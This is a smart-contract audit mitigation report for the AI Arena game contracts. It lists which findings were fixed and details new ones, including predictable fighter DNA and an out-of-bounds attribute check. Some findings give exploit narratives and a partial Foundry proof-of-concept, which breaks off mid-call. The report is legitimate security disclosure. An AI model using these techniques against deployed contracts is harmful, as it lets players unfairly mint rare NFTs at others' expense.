During the mitigation review, the wardens determined that 4 in-scope findings were not fully mitigated, from the original audit. They also surfaced several new issues (5 Medium severity and 1 Low severity/Non-critical). The table below provides details regarding the status of each vulnerability from the original audit that was in-scope for the mitigation review, followed by full details on the new issues and any in-scope vulnerabilities that were not fully mitigated.

| Original Issue | Status of Original Issue | Full Details |
| --- | --- | --- |
| H-01 |  🟢 Mitigation Confirmed | Reports from [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/9), [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/41), and [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/6) |
| H-02 |  🟢 Mitigation Confirmed | Reports from [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/10), [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/42), and [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/4) |
| H-03 |  🟢 Mitigation Confirmed | Reports from [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/21) and [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/3) |
| H-04 |  🟢 Mitigation Confirmed | Reports from [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/22), [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/44), and [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/25) |
| H-06 |  🟢 Mitigation Confirmed | Reports from [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/12), [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/45), and [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/2) |
| H-07 |  🟢 Mitigation Confirmed | Reports from [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/23), [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/46), and [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/26) |
| H-08 |  🟢 Mitigation Confirmed | Reports from [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/28), [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/47), and [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/27) |
| M-03 |  🔴 Unmitigated | Reports from [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/8) and niser93 ([1](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/29), [2](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/13)) - details also shared below |
| M-04 |  🟢 Mitigation Confirmed | Reports from [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/11), [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/15), and [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/49) |
| M-05 |  🔴 Unmitigated | Reports from [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/5), niser93 ([1](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/18), [2](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/17)), and d3e4 ([1](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/50), [2](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/55), [3](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/54)) - details also shared below |
| M-06 |  🔴 Unmitigated | Report from [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/51) - details also shared below |
| M-08 |  🔴 Unmitigated | Report from [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/52) - details also shared below |
| ADD-01 |  🟢 Mitigation Confirmed | Reports from [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/31) and [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/59) |
| ADD-02 |  🟢 Mitigation Confirmed | Reports from [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/34), [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/60), and [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/32) |
| ADD-03 |  🟢 Mitigation Confirmed | Reports from [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/61) and [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/58) |
| ADD-04 |  🟢 Mitigation Confirmed | Reports from [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/64) and [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/62) |
| ADD-05 |  🟢 Mitigation Confirmed | Reports from [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/63) and [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/65) |
| ADD-06 |  🟢 Mitigation Confirmed | Reports from [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/66) and [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/67) |

## [`FighterFarm.reRoll()` method works wrong and allows minting wanted attributes](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/16)
*Submitted by [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/16), also found by [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/5)*

**Severity:** Medium

**Related to the mitigation of:** [M-05](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/376) and [its duplicates](https://github.com/code-423n4/2024-02-ai-arena-findings/issues?q=label%3Aduplicate-376+is%3Aclosed).

Each `fighter` has a specific number of max reRolls, according to `fighterType`. This means that the owner of the `fighter` can call `FighterFarm.reRoll()` at most `maxRerollsAllowed` times, in order to obtain better fighter's attributes.

We want to underline three aspects:

*   `FighterFarm.reRoll()` operation has a cost in NRN
*   `numRerolls` of a specific `fighter` is not reset when it is transfered
*   `dna` is the only value used to compute `fighter`'s traits. After [mitigation](https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/11/commits/255e72b14f124f643003f0cde8eaacaec9ed42e9), `dna` depends just on `tokenId` and `numRerolls[tokenId]`

Because the reasons above, the owner of a `fighter` can always forecast what is the best number of `reRolls`.<br>
So, a cunning player should always improve its `fighter`'s traits using the right number of `reRolls`. For this reason, we could expect that all `fighters` will be reRolled until they reach the best number of `reRolls`.<br>
Furthermore, a malicious player can wait for the right `tokenId` which can be used in `reRoll` operation to obtain a very rare fighter.

### Remaining reRolls of a fighter don't increase its value

We asked in a private thread a clarification on the `FighterFarm.reRoll()` mechanism. This was the answer:

    I: I've another question on reRoll method. A fighter can be reRolled several times. 
    The limit is the MasRerollsAllowed value. When a fighter is transferred from a player to other,
    the numRerolls value is not reset. This means that the onwer can't reRoll the receive fighter, if
    the previous owner used all roll changes. Also this is a wanted behavior?

    Dev: Yes this is intended. You can think of this as someone potentially paying a premium for an NFT that has 
    more reRolls remaining. They should be intrinsically more valuable since they have more optionality.

While this was true before the mitigation, now the `dna` doesn't depend on `msg.sender` anymore. This means that the outcomes of `reRoll` operations made by the seller is the same of the outcomes obtained by the buyer. If they are both cunning players, they know before the transfer if that `fighter` would improve using `FighterFarm.reRoll()` operation or not.

We want to underline that this mechanism strongly changes after the mitigation. As long as the outcome of `reRoll` operation depended on `msg.sender`, buying a `fighter` with remaining `reRoll` operations made sense, because buyer `reRoll` operations would have different outcome then the seller ones.

After mitigation, seller and buyer can reach the same rare attributes. They both should be aware on the best outcome of `reRoll` operation. If not, it could happen because one or both of them are not cunning: the transfer could be not fair, impacting the game and the market.

So, after mitigation, the `reRoll` operation appears as a pretense to pay NRNs. Its initial aim is lost.

### The only right thing to do is to reach the best `numRerolls` for each `fighter`

As we said above, remaining reRolls of a fighter don't increase its market value. So, why a player should decide to not perform `reRoll` operations until reaching the best attributes combination? In this way, each player is forced to use NRNs to reach the best combination, because it doens't make sense to have a non-optimal `fighter`: it hasn't more market value and it can become a better `fighter` for sure.

### A malicious player could wait the right `tokenId` to mint its `fighter` and `reRoll` it

A malicious player could wait to redeem his/her mint pass until he can obtain the wanted `tokenId`. This can be done because that player has foreseen that the wanted `tokenId` combined with a specific `numRerolls` permit obtaining a very rare `fighter`.

### Conclusion

Now, the `reRoll` operation seems useless. It can be used only to have different battle traits (weight and element). So we propose `reRoll` modifies just the battle attributes.

If somebody would sell his/her `fighter`, remaining `numRerolls` doesn't influence the `fighter` value. Before mitigation, there was the possibility that a new player with the right `msg.sender` would obtain better attrbutes for a `fighter`. Now, all players can obtain the same and foreseenable outcome from `reRoll` operations. Furthermore, now malicious players have the possibility to precompute `dna` despite their `msg.sender` and thus they can create `fighter` with wanted rare attributes.

### Proof of concept

This is the mitigated [FighterFarm.reRoll()](https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/blob/setUpAirdrop-mitigation/src/FighterFarm.sol#L412-L436) operation:

    /// @notice Rolls a new fighter with random traits.
    /// @param tokenId ID of the fighter being re-rolled.
    /// @param fighterType The fighter type.
    function reRoll(uint256 tokenId, uint8 fighterType) public {
        require(msg.sender == ownerOf(tokenId));
        require(numRerolls[tokenId] < maxRerollsAllowed[fighterType]);
        require(_neuronInstance.balanceOf(msg.sender) >= rerollCost, "Not enough NRN for reroll");


        _neuronInstance.approveSpender(msg.sender, rerollCost);
        bool success = _neuronInstance.transferFrom(msg.sender, treasuryAddress, rerollCost);
        if (success) {
            numRerolls[tokenId] += 1;
            uint256 dna = uint256(keccak256(abi.encode(tokenId, numRerolls[tokenId])));
            (uint256 element, uint256 weight, uint256 newDna) = _createFighterBase(dna, fighterType);
            fighters[tokenId].element = element;
            fighters[tokenId].weight = weight;
            fighters[tokenId].physicalAttributes = _aiArenaHelperInstance.createPhysicalAttributes(
                newDna,
                generation[fighterType],
                fighters[tokenId].iconsType,
                fighters[tokenId].dendroidBool
            );
            _tokenURIs[tokenId] = "";
        }
    }    

The `dna` is computed at line [FighterFarm.sol#L424](https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/blob/setUpAirdrop-mitigation/src/FighterFarm.sol#L424):

                uint256 dna = uint256(keccak256(abi.encode(tokenId, numRerolls[tokenId])));

It depends just on `tokenId`, which never change, and `numRerolls[tokenId]`, which can change only using `FighterFarm.reRoll()` operation.

Let's `maxRerollsAllowed[fighterType] = 10`. This means this fighter can be rerolled 10 times. We can forecast the `dna` results for each of 10 reroll operations. For example, we forecast that the 5th `reRolled` operation will reach the best attributes combination. So, we know before the first `reRoll` operation that it not makes sense to perform more than 5 `reRolls`.

If this `fighter` can not reach a good attributes combination, we could try to sell it, hoping we find a naive buyer, with all `numRerolls` available. On the other hand, if this `fighter` can reach a good attributes combination, we could make 5 `reRolls`, obtain the optimal attributes combination and use it in battles; or we could sell it, even before use 5 `reRolls`, because the reachable optimal attributes combination can be forecast by everyone, and it becomes an intrinsic value of the `fighter`

### Recommended Mitigation Steps

The issue relies on the pseudorandom mechanism. It is impossible to build a pseudorandom public mechanism that can't be forecasted. Before the mitigation, an external source could be exploited to obtain the wanted `reRoll` outcomes. Now, the best outcome is intrinsic in `fighter`. Furthermore, a malicious player could still exploit the `tokenId` to obtain the wanted `reRoll`. We strongly suggest to use an external oracle or to add `block.timestamp` to the computation of `dna`, to make a bit harder to forecast outcome attributes.



***

## [Element and weight correlation when `numElements` is multiple of 31](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/56)
*Submitted by [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/56)*

**Severity:** Medium

When `numElements` is a multiple of 31 the DNA only generates 1/31 of all intended combinations of `element` and `weight`.

### Proof of Concept

`numElements` maps to a uint8, i.e up to 255.<br>
In `FighterFarm._createFighterBase()` `element` and `weight` are set as

```solidity
uint256 element = dna % numElements[generation[fighterType]];
uint256 weight = dna % 31 + 65;
```

This means that if `numElements[generation[fighterType]]` is multiple of `31`, say `k*31` then only `k*31` different combinations are possible instead of `k*31 * 31`, since `(n + k*31) % (k*31) == (n + k*31) % 31`.

### Recommended Mitigation Steps

Divide by the first mod to extract multiple smaller random numbers from one big random number.

```solidity
uint256 weight = dna % 31 + 65;
dna = dna/31;
uint256 element = dna % numElements[generation[fighterType]];
```

**[ronnyx2017 (judge) commented](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/56#issuecomment-2067938214):**
 > True, n will be \[0,31\].

**[brandinho (AI Arena) commented](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/56#issuecomment-2097310158):**
 > The number of elements will never be 31. Our current plans in fact are for less than 10, but if we're really pushing it then it might go as high as 16. We just used `uint8` because it's the smallest `uint` that we're able to use. As such, this is not actually a risk to our project.

**[ronnyx2017 (judge) commented](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/56#issuecomment-2100912932):**
 > Yep, if you do not use more than 30 elements, then of course this issue will not be triggered. But the max of uint8 is 255, here has never been a maximum value check in the code. Moreover, the issue related to the value 31 also appeared in the original contest such as [issue 1456](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1456) and [issue 1979](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1979). No comments have ever mentioned this condition. In summary, this condition is neither in the code context nor in the context of this contest.



***

## [Players can exploit `mintFromMergingPool` dna calculation to mint rare fighter](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/68)
*Submitted by [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/68), also found by [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/57)*

**Severity:** Medium

**Related to the mitigation of:** [M-05](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/376) and [its duplicates](https://github.com/code-423n4/2024-02-ai-arena-findings/issues?q=label%3Aduplicate-376+is%3Aclosed).

Specifically, this is strongly related to [issue #1017 - Users can get benefited from DNA pseudorandomly calculation](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1017).

It describes 4 impacts:

1.  DNA malipulation in [FighterFarm.reRoll()](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/FighterFarm.sol#L379). It was mitigated in [#16](https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/16/commits/255e72b14f124f643003f0cde8eaacaec9ed42e9).
2.  DNA manipulation in [FighterFarm.mintFromMergingPool()](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/FighterFarm.sol#L313)
3.  DNA malipulation in [FighterFarm.redeemMintPass()](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/FighterFarm.sol#L233). It was mitigated in [#10](https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/10/commits/370b0a02d99d7ade4bd04b9c9b784f56b478e841).
4.  DNA malipulation in [FighterFarm.claimFighters()](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/FighterFarm.sol#L191). It was mitigated in [#11](https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/11/commits/03d35bd8522ae07fc84474c32978bd58fa20ecb8).

We want to focus on 2. In issue \#1017, it is reported:

    In this case, the DNA is computed by the msg.sender (in this case will always be the \_mergingPoolAddress so it is not manipulable) and the number of existing fighters.

    In this function a user can not manipulate the output hash, however, he can compute the hash for the upcoming fighters, because when a new fighter will be created, the fighters.length will change along with the output hash. As a result, a user can claim the MergingPool reward to mint and NFT when the output hash will be benefitial for him.

So, before mitigation, `a user can not manipulate the output hash`, but `can claim the MergingPool reward to mint and NFT when the output hash will be benefitial for him`.

Attempted mitigation was made in [#3](https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/3/files):

    @@ -321,7 +321,7 @@ contract FighterFarm is ERC721, ERC721Enumerable {
            require(msg.sender == _mergingPoolAddress);
            _createNewFighter(
                to, 
    -           uint256(keccak256(abi.encode(msg.sender, fighters.length))), 
    +           uint256(keccak256(abi.encode(to, fighters.length))), 
                modelHash, 
                modelType,
                0,

We think that this mitigation doesn't solve the issue. Furthermore, it introduces a new vulnerability. Now, the user can `manipulate the output hash`, because it depends on the `to` address, which can be manipulated by the user.

### Proof of Concept

The PoC of this issue is similar to the ones in [#53](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/53) and [#519](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/519).

After mitigation, the attributes of the fighter obtained using the [FighterFarm.mintFromMergingPool()](https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/blob/d81beee0df9c5465fe3ae954ce41300a9dd60b7f/src/FighterFarm.sol#L349-L373) depends on two parameters:

    /// @notice Mints a new fighter from the merging pool.
    /// @dev Only the merging pool contract address is authorized to call this function.
    /// @param to The address that the new fighter will be assigned to.
    /// @param modelHash The hash of the ML model associated with the fighter.
    /// @param modelType The type of the ML model associated with the fighter.
    /// @param customAttributes Array with [element, weight] of the newly created fighter.
    function mintFromMergingPool(
        address to, 
        string calldata modelHash, 
        string calldata modelType, 
        uint256[2] calldata customAttributes
    ) 
        public 
    {
        require(msg.sender == _mergingPoolAddress);
        _createNewFighter(
            to, 
            uint256(keccak256(abi.encode(to, fighters.length))), 
            modelHash, 
            modelType,
            0,
            0,
            customAttributes
        );
    }

The value passed to [line L366](https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/blob/d81beee0df9c5465fe3ae954ce41300a9dd60b7f/src/FighterFarm.sol#L366) represents the `dna`.
It depends on the `to` address and the `fighters.length`.

`FighterFarm.mintFromMergingPool()` can be called successfully just by the contract at `_mergingPoolAddress`, i.e., [MergingPool.sol](https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/blob/setUpAirdrop-mitigation/src/MergingPool.sol), using the [MergingPool.claimRewards()](https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/blob/d81beee0df9c5465fe3ae954ce41300a9dd60b7f/src/MergingPool.sol#L137-L175) method:

    /// @notice Allows the user to batch claim rewards for multiple rounds.
    /// @dev The user can only claim rewards once for each round.
    /// @param modelURIs The array of model URIs corresponding to each round and winner address.
    /// @param modelTypes The array of model types corresponding to each round and winner address.
    /// @param customAttributes Array with [element, weight] of the newly created fighter.
    function claimRewards(
        string[] calldata modelURIs, 
        string[] calldata modelTypes,
        uint256[2][] calldata customAttributes,
        uint32 totalRoundsToConsider
    ) 
        external nonReentrant
    {
        uint256 winnersLength;
        uint32 claimIndex = 0;
        uint32 lowerBound = numRoundsClaimed[msg.sender];
        require(lowerBound + totalRoundsToConsider < roundId, "MergingPool: totalRoundsToConsider exceeds the limit");
        uint8 generation = _fighterFarmInstance.generation(0);
        for (uint32 currentRound = lowerBound; currentRound < lowerBound + totalRoundsToConsider; currentRound++) {
            numRoundsClaimed[msg.sender] += 1;
            winnersLength = winnerAddresses[currentRound].length;
            for (uint32 j = 0; j < winnersLength; j++) {
                require(customAttributes[j][0] < _fighterFarmInstance.numElements(generation), "MergingPool: element out of bounds");
                require(customAttributes[j][1] >= 65 && customAttributes[j][1] <= 95, "MergingPool: weight out of bounds");
                if (msg.sender == winnerAddresses[currentRound][j]) {
                    _fighterFarmInstance.mintFromMergingPool(
                        msg.sender,
                        modelURIs[claimIndex],
                        modelTypes[claimIndex],
                        customAttributes[claimIndex]
                    );
                    claimIndex += 1;
                }
            }
        }
        if (claimIndex > 0) {
            emit Claimed(msg.sender, claimIndex);
        }
    }

So, a player can `mintFromMerginPool` only when he/she claims a reward after he/she wins a battle.

Let's explain the attack vector. Before the next round, `fighter.length = 0`. Eve was able to forecast that a very rare fighter can be minted using a specific address, called `address_E`, and when `fighter.length = 10`. She can do that because she can precompute the `dna` value, and use [AiArenaHelper.createPhysicalAttributes()](https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/blob/setUpAirdrop-mitigation/src/AiArenaHelper.sol#L78-L121) to forecast the outcome attributes.

Using [Create2](https://docs.alchemy.com/docs/create2-an-alternative-to-deriving-contract-addresses), Eve can create a malicious contract at address `address_E`. Then Eve mints a new fighter using, for example, a mint pass and tries to win the current round. If she manages to do that, she can use the contract at address `address_E` to claim a reward at the current
round.

Assuming that after this round, `fighter.length = 0` still holds. The malicious contract could implement a call to `MergingPool.claimRewards()` that is called continuously and reverts until `fighter.length = 10`.

In this way, Eve is sure to claim a reward with `address_E` and `fighter.length = 10`, and thus obtain the fighter with wanted characteristics.

### Recommended Mitigation Steps

The problem relies on the usage of an external controlled input by a pseudorandom algorithm. We suggest introducing an oracle to obtain random input numbers, or at least to use `block.timestamp`, to make harder to forecast when the `fighter.length` reaches the wanted value:

```diff
/// @notice Mints a new fighter from the merging pool.
/// @dev Only the merging pool contract address is authorized to call this function.
/// @param to The address that the new fighter will be assigned to.
/// @param modelHash The hash of the ML model associated with the fighter.
/// @param modelType The type of the ML model associated with the fighter.
/// @param customAttributes Array with [element, weight] of the newly created fighter.
function mintFromMergingPool(
    address to, 
    string calldata modelHash, 
    string calldata modelType, 
    uint256[2] calldata customAttributes
) 
    public 
{
    require(msg.sender == _mergingPoolAddress);
    _createNewFighter(
        to, 
-       uint256(keccak256(abi.encode(to, fighters.length))), 
+       uint256(keccak256(abi.encode(to, fighters.length, block.timestamp))), 
        modelHash, 
        modelType,
        0,
        0,
        customAttributes
    );
}
```



***

## [Issue Related to Unintentional Admin Configuration](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/71)
*Submitted by [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/71)*

**Severity:** Medium

**Related to:** [ADD-05](https://github.com/code-423n4/2024-04-ai-arena-mitigation?tab=readme-ov-file#additional-scope-to-be-reviewed)

<https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/blob/1192a55963c92fb4bd9ca8e0453c96af09731235/src/RankedBattle.sol#L206-L210>

Staking and unstaking is controlled in unison. If staking is possible during the battles, the only way to halt staking it is therefore to also halt unstaking. Users may thus stake during the battles and then suddenly not be able to unstake. It seems that if it was possible to stake during the battles it should always be possible to unstake again.

Contrast this with staking and unstaking outside of battles where users can be expected to make up their minds about how much they want to stake before the battles start, and then be committed to this stake (i.e. `allowedStakingDuringRanked` remains `false`).

Being allowed to stake during battles should be interpreted as an added opportunity for the user, with an added risk. The opportunity should not be possible to revoke without also allowing the user to withdraw from the added risk.

Consider not allowing a `true` `allowedStakingDuringRanked` be set to `false` while `rankedOpen == true`. This way the admin's decision to allow staking during battles will always allow users to unstake until the end of the battles.

**[ronnyx2017 (judge) commented via issue \#39](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/39#issuecomment-2067702156):**
 > Although warden's description makes sense, I am more inclined to believe that this is the sponsor's intentional design of timing control and economic model, rather than a bug.
> 
> Would like further review by sponsors.

**[brandinho (AI Arena) commented via issue \#39](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/39#issuecomment-2069453214):**
 > This is a great point. We did not have the intention of allowing admins to change `allowedStakingDuringRanked` while ranked is open. But I think your recommendation of explicitly putting a require in there to prevent accidents is preferred, so we will also implement this recommendation.

**[ronnyx2017 (judge) commented via issue \#39](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/39#issuecomment-2071299346):**
 > Based on the sponsor's comments, we can classify the preconception condition of this issue as unintentional admin configuration. (Medium severity)



***

## [It's not possible to claim `MergingPool` rewards for the last round, only for rounds previous to it](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/7)
*Submitted by [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/7)*

**Severity:** Medium

**Related to the mitigation of:** [M-04: DoS in `MergingPool::claimRewards` function and potential DoS in `RankedBattle::claimNRN` function if called after a significant amount of rounds passed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/868)

Previously, The `MergingPool::claimRewards` function loop could exceed the block gas limit, potentially causing a DoS. This would happen if a user tried claiming their rewards after too many rounds had passed. Similarly, there was a risk of DoS in `RankedBattle::claimNRN` for the same reason.

In both cases, rounds were iterated up to the current round ID non inclusively.

### Mitigation

[PR #18](https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/18)

Now the issue in both functions is fixed thanks to an additional input `uint32 totalRoundsToConsider` which allows users to loop fewer rounds per call. However, the input validation of `totalRoundsToConsider` in `MergingPool::claimRewards` is incorrect:

```solidity
    require(lowerBound + totalRoundsToConsider < roundId, "MergingPool: totalRoundsToConsider exceeds the limit");
    uint8 generation = _fighterFarmInstance.generation(0);
    for (uint32 currentRound = lowerBound; currentRound < lowerBound + totalRoundsToConsider; currentRound++) {
```

`lowerBound + totalRoundsToConsider` can at most be equal to `roundId - 1`, which means that claimRewards() will loop, at most, till `roundId - 2`. Therefore, it's not possible to claim MergingPool rewards for the last round, only for rounds previous to it.

Note that this was [correctly implemented](https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/blob/1192a55963c92fb4bd9ca8e0453c96af09731235/src/RankedBattle.sol#L333) in the `RankedBattle::claimNRN` fix.

### Suggestion

Change

```solidity
    require(lowerBound + totalRoundsToConsider < roundId, "MergingPool: totalRoundsToConsider exceeds the limit");
```

to

```solidity
    require(lowerBound + totalRoundsToConsider <= roundId, "MergingPool: totalRoundsToConsider exceeds the limit");
```

### Conclusion

The mitigation works well but introduces an issue because the new function input is wrongly validated.

**[ronnyx2017 (judge) commented](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/7#issuecomment-2078665426):**
 > This is not a persistent DoS / stuck, but it is unfair for participants in the last round, even though the round is rolled over by the administrator. This also implies that there are scenarios where the round pauses. Overall, this type of non-persistent partial DoS/logic error in invariants falls under category Medium, IMO.



***

## [A player who wants to call `MergingPool.claimRewards()` has to pass parameters with at least `winnersLength` elements](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/13)
*Submitted by [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/13)*

**Severity:** QA (Low / Non-Critical)

**Related to mitigation of:** [M-03](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/932)

[M-03](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/932) finding reports that `Fighter created by mintFromMergingPool can have arbitrary weight and element`.

To mitigate this issue, developers added two lines to [MergingPool.claimRewards()](https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/blob/setUpAirdrop-mitigation/src/MergingPool.sol#L142-L175) method, that is the only one which can call `FighterFarm.mintFromMergingPool()`:

```diff
MergingPool.sol#L142-L175

    function claimRewards(
        string[] calldata modelURIs, 
        string[] calldata modelTypes,
        uint256[2][] calldata customAttributes,
        uint32 totalRoundsToConsider
    ) 
        external nonReentrant
    {
        uint256 winnersLength;
        uint32 claimIndex = 0;
        uint32 lowerBound = numRoundsClaimed[msg.sender];
        require(lowerBound + totalRoundsToConsider < roundId, "MergingPool: totalRoundsToConsider exceeds the limit");
        uint8 generation = _fighterFarmInstance.generation(0);
        for (uint32 currentRound = lowerBound; currentRound < lowerBound + totalRoundsToConsider; currentRound++) {
            numRoundsClaimed[msg.sender] += 1;
            winnersLength = winnerAddresses[currentRound].length;
            for (uint32 j = 0; j < winnersLength; j++) {
+               require(customAttributes[j][0] < _fighterFarmInstance.numElements(generation), "MergingPool: element out of bounds");
+               require(customAttributes[j][1] >= 65 && customAttributes[j][1] <= 95, "MergingPool: weight out of bounds");
                if (msg.sender == winnerAddresses[currentRound][j]) {
                    _fighterFarmInstance.mintFromMergingPool(
                        msg.sender,
                        modelURIs[claimIndex],
                        modelTypes[claimIndex],
                        customAttributes[claimIndex]
                    );
                    claimIndex += 1;
                }
            }
        }
        if (claimIndex > 0) {
            emit Claimed(msg.sender, claimIndex);
        }
    }
```

These two lines check the values of `customAttributes` passed by the player who is claiming the reward.

We want to report two issues:

### Unmitigated risk
It is still possible to pass `customAttributes` out of the bound. For example, if the maximum value of `winnersLength` is 5 and a player tries to claim 6 rewards, the 6th will be not checked. The following is a coded POC:

```
function testClaimRewardsCustomAttributesOutOfBound() public {
        address user0 = vm.addr(1);
        address user1 = vm.addr(2);
        address user2 = vm.addr(3);

        _mintFromMergingPool(user0);
        _mintFromMergingPool(user1);
        _mintFromMergingPool(user2);

        uint256 totalRound = 6;


        uint256[] memory _winners013 = new uint256[](2);
        _winners013[0] = 0;
        _winners013[1] = 1;

        uint256[] memory _winners023 = new uint256[](2);
        _winners023[0] = 0;
        _winners023[1] = 2;

        uint256 totalWinUser1 = 0;
        
        for (uint i = 0; i < totalRound; i++) {
            if (i%2 == 0) {
                _mergingPoolContract.pickWinners(_winners013);
                totalWinUser1 += 1;
            } else {
                _mergingPoolContract.pickWinners(_winners023);
            }
        }

        string[] memory _modelURIs = new string[](totalWinUser1);
        string[] memory _modelTypes = new string[](totalWinUser1);
        uint256[2][] memory _customAttributes = new uint256[2][](totalWinUser1);

        _modelURIs[0] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
        _modelTypes[0] = "original";
        _customAttributes[0][0] = uint256(1);
        _customAttributes[0][1] = uint256(80);

        _modelURIs[1] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
        _modelTypes[1] = "original";
        _customAttributes[1][0] = uint256(1);
        _customAttributes[1][1] = uint256(80);

        _modelURIs[2] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
        _modelTypes[2] = "original";
        _customAttributes[2][0] = uint256(10);
        _customAttributes[2][1] = uint256(99);

        vm.startPrank(user1);
        _mergingPoolContract.claimRewards(
            _modelURIs,
            _modelTypes,
